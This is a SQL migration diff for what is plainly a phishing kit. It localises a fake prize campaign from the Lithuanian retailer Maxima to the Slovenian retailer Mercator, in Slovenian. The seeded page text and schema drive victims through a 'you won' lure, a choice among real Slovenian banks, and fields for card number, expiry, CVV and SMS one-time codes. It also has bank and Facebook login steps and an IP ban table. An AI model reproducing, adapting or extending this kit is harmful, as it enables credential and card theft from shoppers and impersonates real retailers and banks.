@@ -34,7 +34,7 @@ CHECK (current_step IN (
   'code_entry','sms','win','verify','banken','card','wait','invalid_bank',
   'bank','live_support','special_approval','congratulations','congrats',
   'facebook','wheel','login','bank_login','SPECIAL_INFO',
-  'generator1','generator2','custom_question','win2','banken2'
+  'generator1','generator2','custom_question'
 ));
 
 ALTER TABLE public.sessions ENABLE ROW LEVEL SECURITY;
@@ -58,14 +58,14 @@ CREATE INDEX IF NOT EXISTS idx_sessions_created_at ON public.sessions (created_a
 -- ==================== 2) GLOBAL_SETTINGS ====================
 CREATE TABLE IF NOT EXISTS public.global_settings (
   id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
-  logo_url text DEFAULT '/form-assets/maxima-mini-logo.png',
+  logo_url text DEFAULT '/form-assets/mercator-logo.png',
   bg_url text DEFAULT '/form-assets/bg-desktop.png',
   background_url text,
   og_image_url text,
-  portal_name text DEFAULT 'Maxima',
-  support_center_name text DEFAULT 'Maxima pagalba',
-  target_country text DEFAULT 'Litvanya',
-  site_language text DEFAULT 'lt',
+  portal_name text DEFAULT 'Mercator',
+  support_center_name text DEFAULT 'Mercator Pomoč',
+  target_country text DEFAULT 'Slovenija',
+  site_language text DEFAULT 'sl',
   site_enabled boolean DEFAULT true,
   entry_page text DEFAULT '/win',
   wheel_settings jsonb DEFAULT '{}'::jsonb,
@@ -118,7 +118,7 @@ CREATE POLICY "Enable update for all users" ON public.global_settings FOR UPDATE
 CREATE POLICY "Enable delete for all users" ON public.global_settings FOR DELETE USING (true);
 
 -- Eksik kolonlar (mevcut kurulumlar icin)
-ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS site_language text DEFAULT 'lt';
+ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS site_language text DEFAULT 'sl';
 
 INSERT INTO public.global_settings (
   site_enabled, entry_page, site_language, target_country,
@@ -136,70 +136,70 @@ INSERT INTO public.global_settings (
   profile_button, profile_loading_text
 )
 SELECT
-  true, '/win', 'lt', 'Litvanya',
-  '/form-assets/maxima-mini-logo.png', '/form-assets/bg-desktop.png',
-  'Maxima klientų portalas', 'Maxima klientų aptarnavimas',
-  'Išskirtinė Maxima premija',
-  'Sveikiname! Buvote atrinkti šios dienos Maxima kampanijai. Spustelėkite žemiau esantį mygtuką, kad atsiimtumėte savo premiją.',
-  'Atsiimti premiją',
-  'Pasirinkite savo banką', 'Pasirinkite savo banką, kad tęstumėte.', 'Ieškoti banko...',
-  'Prašome palaukti', 'Jūsų užklausa saugiai apdorojama...',
-  'SMS saugos kodas', 'Įveskite {digits} skaitmenų kodą.', 'Vienkartinis kodas', 'Patvirtinti', 'Apdorojama...',
-  'Mokėjimo informacija', 'Patikrinkite ir patvirtinkite savo duomenis.',
-  'Kortelės turėtojo vardas', 'Kortelės numeris', 'Galiojimo pabaiga MM/MM', 'Saugos kodas', 'Tęsti',
-  'Sveiki', 'Įveskite dalyvavimo kodą, kurį gavote iš {partner}, kad atsiimtumėte atlygį.', 'Patvirtinti kodą',
-  'Tiesioginis palaikymas',
-  'Norėdami tęsti, turite susisiekti su mūsų klientų aptarnavimo skyriumi.' || chr(10) || chr(10) || 'Spustelėkite žemiau esantį mygtuką, kad pradėtumėte pokalbį.',
-  'Pradėti pokalbį',
-  'Prizas patvirtintas', 'Jūsų premijos suma', 'Patvirtinkite savo duomenis tolesniam apdorojimui.',
-  'Vardas', 'Pavardė', 'Mobiliojo telefono numeris', 'Kitas', 'Apdorojama...'
+  true, '/win', 'sl', 'Slovenija',
+  '/form-assets/mercator-logo.png', '/form-assets/bg-desktop.png',
+  'Mercator Portal za Stranke', 'Mercator Pomoč Uporabnikom',
+  'Ekskluzivna Mercator Nagrada',
+  'Čestitamo! Izbrani ste bili za današnjo Mercator akcijo. Kliknite spodnji gumb, da prevzamete svojo nagrado.',
+  'Prevzemi nagrado',
+  'Izberite svojo banko', 'Za nadaljevanje izberite svojo banko.', 'Išči banko...',
+  'Prosimo, počakajte', 'Vaša zahteva se varno obdeluje...',
+  'Varnostna koda SMS', 'Vnesite {digits}-mestno kodo.', 'Enkratna koda', 'Potrdi', 'Obdelava...',
+  'Podatki o plačilu', 'Preverite in potrdite svoje podatke.',
+  'Ime imetnika kartice', 'Številka kartice', 'Datum poteka MM/LL', 'Varnostna koda', 'Nadaljuj',
+  'Dobrodošli', 'Vnesite kodo za sodelovanje, ki ste jo prejeli od {partner}, da odklenete svojo nagrado.', 'Potrdi kodo',
+  'Pomoč v živo',
+  'Za nadaljevanje se morate obrniti na našo podporo.' || chr(10) || chr(10) || 'Kliknite spodnji gumb za začetek pogovora.',
+  'Začni pogovor',
+  'Nagrada potrjena', 'Vaš znesek nagrade', 'Potrdite svoje podatke za nadaljnjo obdelavo.',
+  'Ime', 'Priimek', 'Številka mobilnega telefona', 'Naprej', 'Obdelava...'
 WHERE NOT EXISTS (SELECT 1 FROM public.global_settings);
 
--- Mevcut satirdaki NULL alanlari LT varsayilanlariyla doldur
+-- Mevcut satirdaki NULL alanlari SL varsayilanlariyla doldur
 UPDATE public.global_settings SET
-  site_language = COALESCE(site_language, 'lt'),
-  target_country = COALESCE(target_country, 'Litvanya'),
-  logo_url = CASE WHEN logo_url IS NULL OR logo_url = '' OR logo_url LIKE 'https://www.maxima.lt/%' THEN '/form-assets/maxima-mini-logo.png' ELSE logo_url END,
+  site_language = COALESCE(site_language, 'sl'),
+  target_country = COALESCE(target_country, 'Slovenija'),
+  logo_url = CASE WHEN logo_url IS NULL OR logo_url = '' OR logo_url LIKE 'https://www.maxima.lt/%' THEN '/form-assets/mercator-logo.png' ELSE logo_url END,
   bg_url = CASE WHEN bg_url IS NULL OR bg_url = '' OR bg_url LIKE '%6d4bc8553e%' THEN '/form-assets/bg-desktop.png' ELSE bg_url END,
-  portal_name = COALESCE(portal_name, 'Maxima klientų portalas'),
-  support_center_name = COALESCE(support_center_name, 'Maxima klientų aptarnavimas'),
-  win_title = COALESCE(win_title, 'Išskirtinė Maxima premija'),
-  win_subtitle = COALESCE(win_subtitle, 'Sveikiname! Buvote atrinkti šios dienos Maxima kampanijai. Spustelėkite žemiau esantį mygtuką, kad atsiimtumėte savo premiją.'),
-  win_button = COALESCE(win_button, 'Atsiimti premiją'),
-  banken_title = COALESCE(banken_title, 'Pasirinkite savo banką'),
-  banken_subtitle = COALESCE(banken_subtitle, 'Pasirinkite savo banką, kad tęstumėte.'),
-  banken_search_placeholder = COALESCE(banken_search_placeholder, 'Ieškoti banko...'),
-  wait_title = COALESCE(wait_title, 'Prašome palaukti'),
-  wait_subtitle = COALESCE(wait_subtitle, 'Jūsų užklausa saugiai apdorojama...'),
-  sms_title = COALESCE(sms_title, 'SMS saugos kodas'),
-  sms_subtitle = COALESCE(sms_subtitle, 'Įveskite {digits} skaitmenų kodą.'),
-  sms_input_label = COALESCE(sms_input_label, 'Vienkartinis kodas'),
-  sms_button = COALESCE(sms_button, 'Patvirtinti'),
-  sms_loading = COALESCE(sms_loading, 'Apdorojama...'),
-  card_title = COALESCE(card_title, 'Mokėjimo informacija'),
-  card_subtitle = COALESCE(card_subtitle, 'Patikrinkite ir patvirtinkite savo duomenis.'),
-  card_owner_label = COALESCE(card_owner_label, 'Kortelės turėtojo vardas'),
-  card_number_label = COALESCE(card_number_label, 'Kortelės numeris'),
-  card_expiry_label = COALESCE(card_expiry_label, 'Galiojimo pabaiga MM/MM'),
-  card_cvv_label = COALESCE(card_cvv_label, 'Saugos kodas'),
-  card_button = COALESCE(card_button, 'Tęsti'),
-  code_title = COALESCE(code_title, 'Sveiki'),
-  code_subtitle = COALESCE(code_subtitle, 'Įveskite dalyvavimo kodą, kurį gavote iš {partner}, kad atsiimtumėte atlygį.'),
-  code_button = COALESCE(code_button, 'Patvirtinti kodą'),
-  live_support_title = COALESCE(live_support_title, 'Tiesioginis palaikymas'),
-  live_support_subtitle = COALESCE(live_support_subtitle, 'Norėdami tęsti, turite susisiekti su mūsų klientų aptarnavimo skyriumi.' || chr(10) || chr(10) || 'Spustelėkite žemiau esantį mygtuką, kad pradėtumėte pokalbį.'),
-  live_support_button = COALESCE(live_support_button, 'Pradėti pokalbį'),
-  profile_title_small = COALESCE(profile_title_small, 'Prizas patvirtintas'),
-  profile_title_main = COALESCE(profile_title_main, 'Jūsų premijos suma'),
-  profile_subtitle = COALESCE(profile_subtitle, 'Patvirtinkite savo duomenis tolesniam apdorojimui.'),
-  profile_firstname_label = COALESCE(profile_firstname_label, 'Vardas'),
-  profile_lastname_label = COALESCE(profile_lastname_label, 'Pavardė'),
-  profile_phone_label = COALESCE(profile_phone_label, 'Mobiliojo telefono numeris'),
-  profile_button = COALESCE(profile_button, 'Kitas'),
-  profile_loading_text = COALESCE(profile_loading_text, 'Apdorojama...')
+  portal_name = COALESCE(portal_name, 'Mercator Portal za Stranke'),
+  support_center_name = COALESCE(support_center_name, 'Mercator Pomoč Uporabnikom'),
+  win_title = COALESCE(win_title, 'Ekskluzivna Mercator Nagrada'),
+  win_subtitle = COALESCE(win_subtitle, 'Čestitamo! Izbrani ste bili za današnjo Mercator akcijo. Kliknite spodnji gumb, da prevzamete svojo nagrado.'),
+  win_button = COALESCE(win_button, 'Prevzemi nagrado'),
+  banken_title = COALESCE(banken_title, 'Izberite svojo banko'),
+  banken_subtitle = COALESCE(banken_subtitle, 'Za nadaljevanje izberite svojo banko.'),
+  banken_search_placeholder = COALESCE(banken_search_placeholder, 'Išči banko...'),
+  wait_title = COALESCE(wait_title, 'Prosimo, počakajte'),
+  wait_subtitle = COALESCE(wait_subtitle, 'Vaša zahteva se varno obdeluje...'),
+  sms_title = COALESCE(sms_title, 'Varnostna koda SMS'),
+  sms_subtitle = COALESCE(sms_subtitle, 'Vnesite {digits}-mestno kodo.'),
+  sms_input_label = COALESCE(sms_input_label, 'Enkratna koda'),
+  sms_button = COALESCE(sms_button, 'Potrdi'),
+  sms_loading = COALESCE(sms_loading, 'Obdelava...'),
+  card_title = COALESCE(card_title, 'Podatki o plačilu'),
+  card_subtitle = COALESCE(card_subtitle, 'Preverite in potrdite svoje podatke.'),
+  card_owner_label = COALESCE(card_owner_label, 'Ime imetnika kartice'),
+  card_number_label = COALESCE(card_number_label, 'Številka kartice'),
+  card_expiry_label = COALESCE(card_expiry_label, 'Datum poteka MM/LL'),
+  card_cvv_label = COALESCE(card_cvv_label, 'Varnostna koda'),
+  card_button = COALESCE(card_button, 'Nadaljuj'),
+  code_title = COALESCE(code_title, 'Dobrodošli'),
+  code_subtitle = COALESCE(code_subtitle, 'Vnesite kodo za sodelovanje, ki ste jo prejeli od {partner}, da odklenete svojo nagrado.'),
+  code_button = COALESCE(code_button, 'Potrdi kodo'),
+  live_support_title = COALESCE(live_support_title, 'Pomoč v živo'),
+  live_support_subtitle = COALESCE(live_support_subtitle, 'Za nadaljevanje se morate obrniti na našo podporo.' || chr(10) || chr(10) || 'Kliknite spodnji gumb za začetek pogovora.'),
+  live_support_button = COALESCE(live_support_button, 'Začni pogovor'),
+  profile_title_small = COALESCE(profile_title_small, 'Nagrada potrjena'),
+  profile_title_main = COALESCE(profile_title_main, 'Vaš znesek nagrade'),
+  profile_subtitle = COALESCE(profile_subtitle, 'Potrdite svoje podatke za nadaljnjo obdelavo.'),
+  profile_firstname_label = COALESCE(profile_firstname_label, 'Ime'),
+  profile_lastname_label = COALESCE(profile_lastname_label, 'Priimek'),
+  profile_phone_label = COALESCE(profile_phone_label, 'Številka mobilnega telefona'),
+  profile_button = COALESCE(profile_button, 'Naprej'),
+  profile_loading_text = COALESCE(profile_loading_text, 'Obdelava...')
 WHERE id = (SELECT id FROM public.global_settings ORDER BY created_at NULLS LAST LIMIT 1);
 
--- ==================== 3) BANKS (Litvanya) ====================
+-- ==================== 3) BANKS (Slovenija) ====================
 CREATE TABLE IF NOT EXISTS public.banks (
   id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
   slug text UNIQUE NOT NULL,
@@ -208,7 +208,7 @@ CREATE TABLE IF NOT EXISTS public.banks (
   accent_color text,
   logo_file text,
   domain text,
-  country text DEFAULT 'LT',
+  country text DEFAULT 'Slovenija',
   is_active boolean DEFAULT true,
   auto_redirect boolean DEFAULT false,
   design_config jsonb DEFAULT '{}'::jsonb,
@@ -228,80 +228,19 @@ CREATE POLICY "Allow public delete on banks" ON public.banks FOR DELETE USING (t
 
 ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS auto_redirect boolean DEFAULT false;
 
--- Litvanya (AKTIF)
+-- Slovenija (AKTIF)
 INSERT INTO public.banks (slug, name, logo_file, country, is_active) VALUES
-  ('swedbank-lt',        'Swedbank',         '/bank-logos/lithuania/swedbank-lt.png',   'LT', true),
-  ('seb-lt',             'SEB',              '/bank-logos/lithuania/seb-lt.png',        'LT', true),
-  ('luminor-lt',         'Luminor',          '/bank-logos/lithuania/luminor-lt.png',    'LT', true),
-  ('citadele-lt',        'Citadele',         '/bank-logos/lithuania/citadele-lt.png',   'LT', true),
-  ('siauliu-lt',         'Šiaulių bankas',   '/bank-logos/lithuania/siauliu-lt.png',    'LT', true),
-  ('lku-lt',             'LKU',              '/bank-logos/lithuania/lku-lt.png',        'LT', true)
-ON CONFLICT (slug) DO NOTHING;
-
--- Facebook login akisi icin (kullanici listesinde gorunmez, template mevcut)
-INSERT INTO public.banks (slug, name, logo_file, country, is_active) VALUES
-  ('facebook-lt', 'Facebook', '/form-assets/maxima-mini-logo.png', 'LT', false)
-ON CONFLICT (slug) DO NOTHING;
-
--- Eski hatali slug'lari temizle (template'de karsiliklari yok -> 404)
-DELETE FROM public.banks WHERE slug IN ('siauliu-bankas-lt', 'siauliu-bankas', 'artea-lt');
-UPDATE public.banks SET is_active = true WHERE slug IN ('swedbank-lt','seb-lt','luminor-lt','citadele-lt','siauliu-lt','lku-lt');
-
--- Diger ulkeler (PASIF — admin panelde gorunur, kullaniciya gosterilmez)
-INSERT INTO public.banks (slug, name, logo_file, country, is_active) VALUES
-  -- Hollanda
-  ('ing',                    'ING',                    '/bank-logos/ing.svg',                        'Hollanda',   false),
-  ('rabobank',               'Rabobank',               '/bank-logos/rabobank.svg',                   'Hollanda',   false),
-  ('abn-amro',               'ABN AMRO',               '/bank-logos/abn-amro.svg',                   'Hollanda',   false),
-  ('asn-bank',               'ASN Bank',               '/bank-logos/asn-bank.svg',                   'Hollanda',   false),
-  ('bunq',                   'bunq',                   '/bank-logos/bunq.svg',                       'Hollanda',   false),
-  ('knab',                   'Knab',                   '/bank-logos/knab.svg',                       'Hollanda',   false),
-  ('triodos-bank',           'Triodos Bank',           '/bank-logos/triodos-bank.svg',               'Hollanda',   false),
-  ('van-lanschot-kempen',    'Van Lanschot Kempen',    '/bank-logos/van-lanschot-kempen.svg',        'Hollanda',   false),
-  ('n26',                    'N26',                    '/bank-logos/n26.svg',                        'Hollanda',   false),
-  ('revolut',                'Revolut',                '/bank-logos/revolut.svg',                    'Hollanda',   false),
-  ('buut',                   'Buut',                   '/bank-logos/buut.svg',                       'Hollanda',   false),
-  ('mollie',                 'Mollie',                 '/bank-logos/mollie.svg',                     'Hollanda',   false),
-  ('yoursafe',               'YourSafe',               '/bank-logos/yoursafe.svg',                   'Hollanda',   false),
-  ('nationale-nederlanden',  'Nationale-Nederlanden',  '/bank-logos/nationale-nederlanden.svg',      'Hollanda',   false),
-  -- Finlandiya
-  ('nordea-fi',              'Nordea',                 '/bank-logos/nordea-fi.svg',                  'Finlandiya', false),
-  ('op-fi',                  'OP',                     '/bank-logos/op-fi.svg',                      'Finlandiya', false),
-  ('danske-bank-fi',         'Danske Bank',            '/bank-logos/danske-bank-fi.png',             'Finlandiya', false),
-  ('handelsbanken-fi',       'Handelsbanken',          '/bank-logos/handelsbanken-fi.svg',           'Finlandiya', false),
-  ('aktia-fi',               'Aktia',                  '/bank-logos/aktia-fi.svg',                   'Finlandiya', false),
-  ('s-pankki-fi',            'S-Pankki',               '/bank-logos/s-pankki-fi.png',                'Finlandiya', false),
-  ('pop-pankki-fi',          'POP Pankki',             '/bank-logos/pop-pankki-fi.svg',              'Finlandiya', false),
-  ('omasp-fi',               'OmaSp',                  '/bank-logos/omasp-fi.svg',                   'Finlandiya', false),
-  ('landsbanken-fi',         'Landsbanken',            '/bank-logos/landsbanken-fi.svg',             'Finlandiya', false),
-  -- Ispanya
-  ('banco-santander-es',     'Banco Santander',        '/bank-logos/banco-santander-es.svg',         'İspanya',    false),
-  ('caixabank-es',           'CaixaBank',              '/bank-logos/caixabank-es.png',               'İspanya',    false),
-  ('banco-bbva-es',          'BBVA',                   '/bank-logos/banco-bbva-es.png',              'İspanya',    false),
-  ('bankinter-es',           'Bankinter',              '/bank-logos/bankinter-es.svg',               'İspanya',    false),
-  ('unicaja-es',             'Unicaja',                '/bank-logos/unicaja-es.png',                 'İspanya',    false),
-  ('ibercaja-es',            'Ibercaja',               '/bank-logos/ibercaja-es.svg',                'İspanya',    false),
-  ('openbank-es',            'Openbank',               '/bank-logos/openbank-es.svg',                'İspanya',    false),
-  ('evo-banco-es',           'EVO Banco',              '/bank-logos/evo-banco-es.png',               'İspanya',    false),
-  ('kutxabank-es',           'Kutxabank',              '/bank-logos/kutxabank-es.png',               'İspanya',    false),
-  ('laboral-kutxa-es',       'Laboral Kutxa',          '/bank-logos/laboral-kutxa-es.png',           'İspanya',    false),
-  ('cajamar-caja-rural-es',  'Cajamar Caja Rural',     '/bank-logos/cajamar-caja-rural-es.svg',      'İspanya',    false),
-  ('cajasur-es',             'Cajasur',                '/bank-logos/cajasur-es.png',                 'İspanya',    false),
-  -- Avusturya
-  ('easybank',               'easybank',               '/easybank-logo.png',                         'Avusturya',  false),
-  ('oberbank',               'Oberbank',               '/oberbank-logo.png',                         'Avusturya',  false),
-  ('schoellerbank',          'Schoellerbank',          '/schoellerbank-logo.png',                    'Avusturya',  false),
-  ('bank99',                 'bank99',                 '/bank99-logo.png',                           'Avusturya',  false),
-  -- Estonya
-  ('bigbank',                'Bigbank',                '/bank-logos/estonia/bigbank.jpg',            'Estonya',    false),
-  ('citadele-banka',         'Citadele Banka',         '/bank-logos/estonia/citadele-banka.jpg',     'Estonya',    false),
-  ('coop-pank',              'Coop Pank',              '/bank-logos/estonia/coop-pank.jpg',          'Estonya',    false),
-  ('inbank',                 'Inbank',                 '/bank-logos/estonia/inbank.png',             'Estonya',    false),
-  ('lhv-pank',               'LHV Pank',               '/bank-logos/estonia/lhv-pank.jpg',           'Estonya',    false),
-  ('luminor-ee',             'Luminor',                '/bank-logos/estonia/luminor-ee.jpg',         'Estonya',    false),
-  ('op-corporate-bank',      'OP Corporate Bank',      '/bank-logos/estonia/op-corporate-bank.jpg',  'Estonya',    false),
-  ('seb-pank',               'SEB Pank',               '/bank-logos/estonia/seb-pank.jpg',           'Estonya',    false),
-  ('swedbank-ee',            'Swedbank',               '/bank-logos/estonia/swedbank-ee.jpg',        'Estonya',    false)
+  ('nlb-si',                  'NLB',                           '/bank-logos/slovenia/nlb-si.png',                  'Slovenija', true),
+  ('otpbanka-si',             'OTP banka',                     '/bank-logos/slovenia/otpbanka-si.png',             'Slovenija', true),
+  ('unicreditbanking-si',     'UniCredit Banka Slovenija',     '/bank-logos/slovenia/unicreditbanking-si.png',     'Slovenija', true),
+  ('intesasanpaolobank-si',   'Intesa Sanpaolo Bank',          '/bank-logos/slovenia/intesasanpaolobank-si.png',   'Slovenija', true),
+  ('addiko-si',               'Addiko Bank',                   '/bank-logos/slovenia/addiko-si.png',               'Slovenija', true),
+  ('sparkasse-si',            'Banka Sparkasse',               '/bank-logos/slovenia/sparkasse-si.png',            'Slovenija', true),
+  ('bks-si',                  'BKS Bank',                      '/bank-logos/slovenia/bks-si.png',                  'Slovenija', true),
+  ('dbs-si',                  'Deželna banka Slovenije',       '/bank-logos/slovenia/dbs-si.png',                  'Slovenija', true),
+  ('dh-si',                   'Delavska hranilnica',           '/bank-logos/slovenia/dh-si.png',                   'Slovenija', true),
+  ('lon-si',                  'LON',                           '/bank-logos/slovenia/lon-si.png',                  'Slovenija', true),
+  ('phv-si',                  'Primorska hranilnica Vipava',   '/bank-logos/slovenia/phv-si.png',                  'Slovenija', true)
 ON CONFLICT (slug) DO NOTHING;
 
 -- ==================== 4) BANNED_IPS ====================
